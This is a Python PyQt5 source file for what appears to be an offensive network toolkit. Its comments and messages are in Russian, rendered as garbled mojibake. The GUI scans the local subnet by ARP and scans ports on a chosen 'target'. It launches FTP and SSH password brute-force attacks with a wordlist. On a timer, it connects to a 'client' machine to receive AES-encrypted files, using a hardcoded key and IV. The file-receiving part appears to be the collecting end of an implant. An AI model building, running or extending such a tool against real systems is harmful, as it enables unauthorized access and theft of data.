from PyQt5 import QtWidgets, uic, QtCore
from PyQt5.QtWidgets import QApplication
from PyQt5.QtCore import Qt, QRegExp
from PyQt5.QtGui import QRegExpValidator
from Crypto.Cipher import AES
from datetime import datetime
import sys, time, os, random, socket

from scripts import ftp_brute, ssh_brute
# –ó–∞–≥—Ä—É–∑–∫–∞ UI-—Ñ–∞–π–ª–∞
try:
    Form, _ = uic.loadUiType("main.ui")
except Exception as e:
    print(f"‚ùå–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ UI: {e}")
    sys.exit(1)

import scripts.scaner_of_ip_port
ip_client = ''

class Ui(QtWidgets.QMainWindow, Form):
    def __init__(self):
        super(Ui, self).__init__()
        self.setupUi(self)

        self.pushButton_scanner_ip.clicked.connect(self.on_button_click_scanner_ip)
        self.pushButton_find_client.clicked.connect(self.on_button_click_find_client)
        self.pushButton_list_port.clicked.connect(self.on_button_click_list_port)
        self.pushButton_ftp.clicked.connect(self.on_button_click_ftp)
        self.pushButton_ssh.clicked.connect(self.on_button_click_ssh)

        self.progressBar.setValue(0)

        self.checkBox_auto_search.stateChanged.connect(self.toggle_timer)
        self.comboBox_time.addItems(["3 —Å–µ–∫—É–Ω–¥—ã", "10 —Å–µ–∫—É–Ω–¥", "30 —Å–µ–∫—É–Ω–¥", "60 —Å–µ–∫—É–Ω–¥"])
        self.comboBox_time.currentIndexChanged.connect(self.change_interval)
        self.intervals = {
            "3 —Å–µ–∫—É–Ω–¥—ã": 3000,
            "10 —Å–µ–∫—É–Ω–¥": 10000,
            "30 —Å–µ–∫—É–Ω–¥": 30000,
            "60 —Å–µ–∫—É–Ω–¥": 60000
        }
        self.current_interval = 5000  # –ò–Ω—Ç–µ—Ä–≤–∞–ª –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é: 1 —Å–µ–∫—É–Ω–¥–∞
        # –°–æ–∑–¥–∞–µ–º —Ç–∞–π–º–µ—Ä
        self.timer = QtCore.QTimer(self)
        self.timer.timeout.connect(self.on_button_get_file)  # –°–æ–µ–¥–∏–Ω—è–µ–º —Å–∏–≥–Ω–∞–ª —Ç–∞–π–º–µ—Ä–∞ —Å –º–µ—Ç–æ–¥–æ–º
        
        ip_regex = QRegExp(r"^(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\."
                           r"(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\."
                           r"(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\."
                           r"(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)$")
        
        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –≤–∞–ª–∏–¥–∞—Ç–æ—Ä
        validator = QRegExpValidator(ip_regex)
        self.lineEdit_brute_ip.setValidator(validator)
        self.lineEdit_ip_port_scan.setValidator(validator)
        self.lineEdit_ip_get_file.setValidator(validator)

    def toggle_timer(self, state):
            """–í–∫–ª—é—á–µ–Ω–∏–µ –∏–ª–∏ –æ—Ç–∫–ª—é—á–µ–Ω–∏–µ —Ç–∞–π–º–µ—Ä–∞ –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è –≥–∞–ª–æ—á–∫–∏."""
            if state == QtCore.Qt.Checked:
                self.timer.start(self.current_interval)  # –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä —Å –≤—ã–±—Ä–∞–Ω–Ω—ã–º –∏–Ω—Ç–µ—Ä–≤–∞–ª–æ–º
            else:
                self.timer.stop()  # –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–∞–π–º–µ—Ä

    def change_interval(self):
            """–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∏–Ω—Ç–µ—Ä–≤–∞–ª–∞ –Ω–∞ –æ—Å–Ω–æ–≤–µ –≤—ã–±—Ä–∞–Ω–Ω–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è –∏–∑ –≤—ã–ø–∞–¥–∞—é—â–µ–≥–æ —Å–ø–∏—Å–∫–∞."""
            selected_text = self.comboBox_time.currentText()
            self.current_interval = self.intervals[selected_text]
            if self.checkBox_auto_search.isChecked():  # –ï—Å–ª–∏ —Ç–∞–π–º–µ—Ä —É–∂–µ –∑–∞–ø—É—â–µ–Ω, –æ–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ç–µ—Ä–≤–∞–ª
                self.timer.start(self.current_interval)

    def on_button_get_file(self):
        now = datetime.now()
        KEY = b'Sixteen byte key'  # 16-–±–∞–π—Ç–Ω—ã–π –∫–ª—é—á (–¥–æ–ª–∂–µ–Ω —Å–æ–≤–ø–∞–¥–∞—Ç—å —Å —Å–µ—Ä–≤–µ—Ä–æ–º)
        IV = b'This is an IV456'  # 16-–±–∞–π—Ç–Ω—ã–π IV (–¥–æ–ª–∂–µ–Ω —Å–æ–≤–ø–∞–¥–∞—Ç—å —Å —Å–µ—Ä–≤–µ—Ä–æ–º)

        def decrypt_file(encrypted_data):
            try:
                """ –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ –ø–æ–ª—É—á–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö """
                cipher = AES.new(KEY, AES.MODE_CFB, IV)
                decrypted_data = cipher.decrypt(encrypted_data)
                return decrypted_data
            except Exception as e:
                print(f"–û—à–∏–±–∫–∞: {e}")

        def receive_file(server_socket, save_path):
            """ –ü–æ–ª—É—á–µ–Ω–∏–µ –∏ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ —Ñ–∞–π–ª–∞ """
            try:
                encrypted_data = server_socket.recv(4096)  # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ
                decrypted_data = decrypt_file(encrypted_data)

                with open(save_path, 'wb') as file:
                    file.write(decrypted_data)

                print(f"üîì –§–∞–π–ª —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–µ–Ω –∏ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω -> {save_path}")
                self.textBrowser_errors_get.setStyleSheet("color: green;")
                self.textBrowser_errors_get.setText(f"üîì –§–∞–π–ª —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–µ–Ω –∏ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω -> {save_path}")
            except Exception as e:
                print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞: {e}")
            finally:
                server_socket.close()
        if self.lineEdit_ip_get_file.text() == '':
            self.textBrowser_errors_get.setStyleSheet("color: red;")
            self.textBrowser_errors_get.setText("üñ•–í–≤–µ–¥–∏—Ç–µ IP-–∞–¥—Ä–µ—Å –∫–ª–∏–µ–Ω—Ç–∞, –æ—Ç –∫–æ—Ç–æ—Ä–æ–≥–æ –±—É–¥–µ—Ç –ø–æ–ª—É—á–µ–Ω —Ñ–∞–π–ª")
            self.timer.stop()
            self.checkBox_auto_search.setChecked(False)
        else:
            try:
                if self.lineEdit_ip_get_file.text() == "":
                    print("üñ•–í–≤–µ–¥–∏—Ç–µ IP-–∞–¥—Ä–µ—Å –∫–ª–∏–µ–Ω—Ç–∞, –æ—Ç –∫–æ—Ç–æ—Ä–æ–≥–æ –±—É–¥–µ—Ç –ø–æ–ª—É—á–µ–Ω —Ñ–∞–π–ª")
                    self.textBrowser_errors_get.setStyleSheet("color: red;")
                    self.textBrowser_errors_get.setText("üñ•–í–≤–µ–¥–∏—Ç–µ IP-–∞–¥—Ä–µ—Å –∫–ª–∏–µ–Ω—Ç–∞, –æ—Ç –∫–æ—Ç–æ—Ä–æ–≥–æ –±—É–¥–µ—Ç –ø–æ–ª—É—á–µ–Ω —Ñ–∞–π–ª")
                else:  
                    # ip_client = '192.168.2.101'  # IP —Å–µ—Ä–≤–µ—Ä–∞
                    print(self.lineEdit_ip_get_file.text())
                    port = 12346

                    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    client_socket.connect((self.lineEdit_ip_get_file.text(), port))

                    receive_file(client_socket, now.strftime("%Y-%m-%d_%H-%M-%S")+'.txt')

                    self.timer.stop()
                    self.checkBox_auto_search.setChecked(False)

            except Exception as e:
                self.textBrowser_errors_get.setStyleSheet("color: red;")
                self.textBrowser_errors_get.setText(f"‚ùå –û—à–∏–±–∫–∞: {e}")
                print(f"–û—à–∏–±–∫–∞: {e}")

    def on_button_click_scanner_ip(self):
        QApplication.setOverrideCursor(Qt.WaitCursor)
        try:
            # self.textBrowser_errors.setText("")
            # self.progressBar.setValue(0)  # –°–±—Ä–æ—Å –ø—Ä–æ–≥—Ä–µ—Å—Å–∞
            # self.progressBar.setMaximum(100)
            # self.start_progress()

            from scripts.get_ip_address_of_wifi import address
            from scripts.router_ip import ip_router
            self.label_your_ip.setText(f"üíª–í–∞—à IP-–∞–¥—Ä–µ—Å: {address}")
            self.label_router_ip.setText("üñ•Default Gateway: " + ip_router)
            
            subnet = str(address + "/24")
            # subnet = address.rsplit('.',1)[0]
            # import scripts.scanner_of_ip
            # available_ips = scripts.scanner_of_ip.scan_network(subnet)

            import scapy.all as sc
            arp_request = sc.ARP(pdst=subnet)
            broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = sc.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

            devices = []
            import requests
           
            for sent, received in answered_list:
                response = requests.get(f"https://api.macvendors.com/{received.hwsrc}")
                if response.status_code == 200:
                    manufac = response.text
                else:
                    manufac = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å"
                devices.append({"IP": received.psrc, "MAC": received.hwsrc, "–ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å": manufac})

            for device in devices:
                # if device == ip_router:
                #     print(f"IP: {device['IP']} - MAC: {device['MAC']} üñ•Default Gateway")
                #     self.textBrowser_ip_list.append(f"IP: {device['IP']} - MAC: {device['MAC']} (üñ•Default Gateway)")  # –ò–∑–º–µ–Ω—è–µ–º —Ç–µ–∫—Å—Ç –Ω–∞ –º–µ—Ç–∫–µ
                #     continue

                # if device == address:
                #     print(f"IP: {device['IP']} - MAC: {device['MAC']} üíª–¢–≤–æ–π IP-–∞–¥—Ä–µ—Å")
                #     self.textBrowser_ip_list.append(f"IP: {device['IP']} - MAC: {device['MAC']} (üíª–í–∞—à IP-–∞–¥—Ä–µ—Å)")  # –ò–∑–º–µ–Ω—è–µ–º —Ç–µ–∫—Å—Ç –Ω–∞ –º–µ—Ç–∫–µ
                #     continue   
                # print(device)
                self.textBrowser_ip_list.append(f"IP: {device['IP']} - MAC: {device['MAC']} - –ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å: {device['–ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å']}")  # –ò–∑–º–µ–Ω—è–µ–º —Ç–µ–∫—Å—Ç –Ω–∞ –º–µ—Ç–∫–µ

            self.textBrowser_errors.setStyleSheet("color: green;")
            self.textBrowser_errors.setText("‚úÖ–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ")
            print("‚úÖ–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ")

            
        except Exception as e:
            self.textBrowser_errors.setStyleSheet("color: red;")
            self.textBrowser_errors.setText(f"‚ùå –û—à–∏–±–∫–∞: {e}")
            print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
            # sys.exit(1)

        # self.progressBar.setValue(100)
        QApplication.setOverrideCursor(Qt.ArrowCursor)

    def on_button_click_find_client(self):
        QApplication.setOverrideCursor(Qt.WaitCursor)
        try:
            self.textBrowser_errors.setText("")
            # self.progressBar.setValue(0)  # –°–±—Ä–æ—Å –ø—Ä–æ–≥—Ä–µ—Å—Å–∞
            # self.progressBar.setMaximum(100)
            # self.start_progress()
            
            from scripts.server import ip_address
            self.label_client_ip.setText(f"üíªIP –∫–ª–∏–µ–Ω—Ç–∞: {ip_address}")
            self.lineEdit_ip_port_scan.setText(ip_address)
            self.lineEdit_brute_ip.setText(ip_address)
            self.lineEdit_ip_get_file.setText(ip_address)
            global ip_client
            ip_client = ip_address
        except Exception as e:
            self.textBrowser_errors.setStyleSheet("color: red;")
            self.textBrowser_errors.setText(f"‚ùå –û—à–∏–±–∫–∞: {e}")
            print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
            # sys.exit(1)

        # self.progressBar.setValue(100)
        QApplication.setOverrideCursor(Qt.ArrowCursor)

    def on_button_click_list_port(self):
        QApplication.setOverrideCursor(Qt.WaitCursor)
        try:
            self.textBrowser_errors.setText("")
            global ip_client
            if ip_client != '' and self.lineEdit_ip_port_scan.text() == '':
                self.progressBar.setValue(0)  # –°–±—Ä–æ—Å –ø—Ä–æ–≥—Ä–µ—Å—Å–∞
                self.progressBar.setMaximum(100)
                self.start_progress()
                self.textBrowser_list_port.setText(scripts.scaner_of_ip_port.scan_common_ports(ip_client))
            elif self.lineEdit_ip_port_scan.text() != '':
                self.progressBar.setValue(0)  # –°–±—Ä–æ—Å –ø—Ä–æ–≥—Ä–µ—Å—Å–∞
                self.progressBar.setMaximum(100)
                self.start_progress()
                self.textBrowser_list_port.setText(scripts.scaner_of_ip_port.scan_common_ports(self.lineEdit_ip_port_scan.text()))
            else:
                print("–û—à–∏–±–∫–∞: –≤–≤–µ–¥–∏—Ç–µ IP-–∞–¥—Ä–µ—Å —Ü–µ–ª–∏ –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ—Ä—Ç–æ–≤")
                self.textBrowser_errors.setStyleSheet("color: red;")
                self.textBrowser_errors.setText("–û—à–∏–±–∫–∞: –≤–≤–µ–¥–∏—Ç–µ IP-–∞–¥—Ä–µ—Å —Ü–µ–ª–∏ –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ—Ä—Ç–æ–≤")
        except Exception as e:
            print(ip_client)
            self.textBrowser_errors.setStyleSheet("color: red;")
            self.textBrowser_errors.setText(f"‚ùå –û—à–∏–±–∫–∞: {e}")
            print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
            # sys.exit(1)

        self.progressBar.setValue(100)
        QApplication.setOverrideCursor(Qt.ArrowCursor)

    def on_button_click_ftp(self):
        QApplication.setOverrideCursor(Qt.WaitCursor)
        try:
            self.textBrowser_errors.setText("")
            
            
            if self.lineEdit_brute_ip.text() == "":
                self.textBrowser_errors.setStyleSheet("color: red;")
                self.textBrowser_errors.setText("–û—à–∏–±–∫–∞: –≤–≤–µ–¥–∏—Ç–µ IP-–∞–¥—Ä–µ—Å —Ü–µ–ª–∏")
                print("–≤–≤–µ–¥–∏—Ç–µ IP-–∞–¥—Ä–µ—Å —Ü–µ–ª–∏")

            elif self.lineEdit_brute_ip.text() != "":
                if self.lineEdit_brute_file.text() == "":         
                    self.textBrowser_brute.setText(ftp_brute.ftp_bruteforce(self.lineEdit_brute_ip.text(), 'pwlist\\password.txt'))
                    print(self.lineEdit_brute_ip.text() + " " + 'pwlist\\password.txt')
                else:
                    if os.path.isfile(self.lineEdit_brute_file.text()):
                        print(f"–§–∞–π–ª –Ω–∞–π–¥–µ–Ω: " + self.lineEdit_brute_file.text())
                        print(self.lineEdit_brute_ip.text() + " " + self.lineEdit_brute_file.text())
                        self.textBrowser_brute.setText(ftp_brute.ftp_bruteforce(self.lineEdit_brute_ip.text(), self.lineEdit_brute_file.text()))
                    else:
                        print(f"–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω: "+ self.lineEdit_brute_file.text() +". –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑ –∏–ª–∏ –æ—Å—Ç–∞–≤—å—Ç–µ —Å—Ç—Ä–æ–∫—É –ø—É—Å—Ç–æ–π")
            else:
                print("err")
        except Exception as e:
            self.textBrowser_errors.setStyleSheet("color: red;")
            self.textBrowser_errors.setText(f"‚ùå –û—à–∏–±–∫–∞: {e}")
            print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
        QApplication.setOverrideCursor(Qt.ArrowCursor)

    def on_button_click_ssh(self):
        QApplication.setOverrideCursor(Qt.WaitCursor)
        try:
            self.textBrowser_errors.setText("")
            global ip_client
            path = 'pwlist\\password.txt'

            if self.lineEdit_brute_ip.text() == "":
                self.textBrowser_errors.setStyleSheet("color: red;")
                self.textBrowser_errors.setText("–û—à–∏–±–∫–∞: –≤–≤–µ–¥–∏—Ç–µ IP-–∞–¥—Ä–µ—Å —Ü–µ–ª–∏")
                print(self.lineEdit_brute_ip.text() + " " + ip_client)
                print("–≤–≤–µ–¥–∏—Ç–µ IP-–∞–¥—Ä–µ—Å —Ü–µ–ª–∏")

            elif self.lineEdit_brute_ip.text().strip() != "":
                if self.lineEdit_brute_file.text().strip() == "":         
                    self.textBrowser_brute.setText(ssh_brute.check_ssh_login(ip_client, path))
                    print(self.lineEdit_brute_ip.text() + " " + path)
                else:
                    print(self.lineEdit_brute_ip.text() + " " + self.lineEdit_brute_file.text())
                    self.textBrowser_brute.setText(ssh_brute.check_ssh_login(self.lineEdit_brute_ip.text(), self.lineEdit_brute_file.text()))
            else:
                print("err")
        except Exception as e:
            self.textBrowser_errors.setStyleSheet("color: red;")
            self.textBrowser_errors.setText(f"‚ùå –û—à–∏–±–∫–∞: {e}")
            print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
        QApplication.setOverrideCursor(Qt.ArrowCursor)

    def start_progress(self):
        # –û–±–Ω–æ–≤–ª—è–µ–º progressBar —Å –∑–∞–¥–µ—Ä–∂–∫–æ–π
        for value in range(0, random.randint(50, 90), 1):  # –û—Ç 0 –¥–æ 100 —Å —à–∞–≥–æ–º 10
            self.progressBar.setValue(value)  # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∑–Ω–∞—á–µ–Ω–∏–µ
            time.sleep(random.uniform(0.01, 0.1))  # –ó–∞–¥–µ—Ä–∂–∫–∞ –≤ 0.5 —Å–µ–∫—É–Ω–¥—ã

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    main_window = Ui()
    main_window.show()
    sys.exit(app.exec_())
